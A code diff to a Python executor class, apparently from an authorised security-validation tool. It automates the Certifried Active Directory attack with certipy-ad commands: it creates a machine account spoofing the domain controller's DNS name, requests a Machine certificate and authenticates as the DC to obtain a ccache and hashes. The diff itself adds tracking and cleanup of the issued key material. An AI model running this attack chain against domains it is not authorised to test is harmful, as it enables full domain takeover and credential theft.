@@ -49,6 +49,7 @@ from ..recommend import (ParamSpec, ParamValue, values,
 from .. import proof
 from .. import states
 from ._reveal_common import key_material, pkinit_hashes
+from ._rollback_common import key_material_obligation, key_material_paths
 from .base import (SecretReveal, ValidationExecutor, ExecutorContext, StepRecord, RunResult,
                    redact_argv, Capability, CAP_CCACHE)
 from .coercion import machine_account, _short_name
@@ -222,6 +223,8 @@ class CertifriedExecutor(ValidationExecutor):
 
         create_argv = ["certipy-ad", "account", "create", *op_auth, "-dc-ip", dc,
                        "-user", new, "-pass", new_pass, "-dns", dc_fqdn]
+        ctx._pending_teardown = key_material_obligation(
+            out_dir, computer=new, dc_fqdn=dc_fqdn, certificate_possible=False)
         res = ctx.runner.run(create_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
         create_ok = bool(_RE_ACCOUNT_CREATED.search((res.stdout or "") + (res.stderr or "")))
         record("account_create", create_argv, res, create_ok,
@@ -234,10 +237,12 @@ class CertifriedExecutor(ValidationExecutor):
         # 2) request a Machine-template cert on the (unpatched) CA ------------
         req_argv = ["certipy-ad", "req", "-u", f"{new}$@{cfg.domain}", "-p", new_pass,
                     "-dc-ip", dc, "-ca", ca, "-template", "Machine", "-target", ca_host]
+        ctx._pending_teardown["certificate_possible"] = True
         res = ctx.runner.run(req_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
         req_out = (res.stdout or "") + (res.stderr or "")
         issued_ok = bool(_RE_REQ_ISSUED.search(req_out))
         pfx = self._parse_pfx(req_out, out_dir, new)     # secret path
+        ctx._pending_teardown["pfx"] = pfx
         impersonated = machine_account(dc_fqdn) or (f"{_short_name(dc_fqdn)}$" if dc_fqdn else "<dc>$")
         artifact["_reveal"].extend(key_material(self.technique, "pfx", impersonated, pfx))
         record("cert_request", req_argv, res, issued_ok,
@@ -254,6 +259,7 @@ class CertifriedExecutor(ValidationExecutor):
         auth_out = (res.stdout or "") + (res.stderr or "")
         auth_ok = bool(_RE_AUTH_OK.search(auth_out))
         ccache = self._parse_ccache(auth_out, out_dir)
+        ctx._pending_teardown["ccache"] = ccache
         artifact["_reveal"].extend(key_material(self.technique, "ccache", impersonated, ccache))
         artifact["_reveal"].extend(pkinit_hashes(self.technique, impersonated, auth_out))
         record("cert_auth", auth_argv, res, auth_ok,
@@ -281,9 +287,10 @@ class CertifriedExecutor(ValidationExecutor):
                 note="rollback DEFERRED to chain teardown (composed front)"))
             complete = bool(issued_ok and auth_ran)
             finish_artifact(steps, gate, mutation, terminal_fact, complete, errors)
-            artifact["teardown_obligation"] = {
-                "method": "certipy account delete + LDAP read-back + destroy pfx",
-                "computer": new, "dc_fqdn": dc_fqdn, "pfx": pfx, "ccache": ccache}
+            ctx._pending_teardown.update(
+                method="certipy account delete + LDAP read-back + destroy pfx",
+                pfx=pfx, ccache=ccache)
+            artifact["teardown_obligation"] = ctx._pending_teardown
             artifact["_composed_products"] = {
                 "ccache": ccache, "pfx": pfx, "principal": impersonated}
             return artifact
@@ -329,7 +336,9 @@ class CertifriedExecutor(ValidationExecutor):
                                     returncode=res.returncode if res else None, note=note))
 
         self._rollback(ctx, cfg, new, o.get("dc_fqdn") or "", op_auth, mutation,
-                       steps, errors, o.get("pfx"), o.get("ccache"), record)
+                       steps, errors, o.get("pfx"), o.get("ccache"), record,
+                       key_paths=key_material_paths(o),
+                       certificate_possible=o.get("certificate_possible", False))
         return {"performed": mutation["rollback"]["performed"],
                 "verified": mutation["rollback"]["verified"],
                 "method": mutation["rollback"]["method"],
@@ -338,7 +347,7 @@ class CertifriedExecutor(ValidationExecutor):
 
     # ---------------------------------------------------------------- rollback
     def _rollback(self, ctx, cfg, new, dc_fqdn, op_auth, mutation, steps, errors,
-                  pfx, ccache, record) -> None:
+                  pfx, ccache, record, *, key_paths=(), certificate_possible=False) -> None:
         """Delete the created computer, verify via a POSITIVE LDAP read-back (the
         bind succeeded AND the computer is absent -- never a vacuous empty query),
         and destroy the issued pfx key material (H2)."""
@@ -374,9 +383,14 @@ class CertifriedExecutor(ValidationExecutor):
                note="computer absent (read confirmed)" if cleared else "deletion not confirmed")
 
         # Destroy the issued pfx key material; required only when a cert was issued.
-        had_pfx = bool(pfx) and Path(pfx).exists()
-        destroyed = self._destroy_key_material([pfx, ccache], steps)
-        pfx_ok = destroyed or not had_pfx
+        if ctx._pending_teardown is not None:
+            key_paths = [*key_paths, *key_material_paths(ctx._pending_teardown)]
+            certificate_possible = (certificate_possible
+                                    or ctx._pending_teardown.get("certificate_possible", False))
+        paths = list(dict.fromkeys(p for p in [pfx, ccache, *key_paths] if p))
+        had_key_material = any(Path(p).exists() for p in paths)
+        destroyed = self._destroy_key_material(paths, steps)
+        pfx_ok = destroyed or (not had_key_material and not certificate_possible)
 
         mutation["rollback"]["verified"] = bool(del_ok and cleared and pfx_ok)
         if not mutation["rollback"]["verified"]:
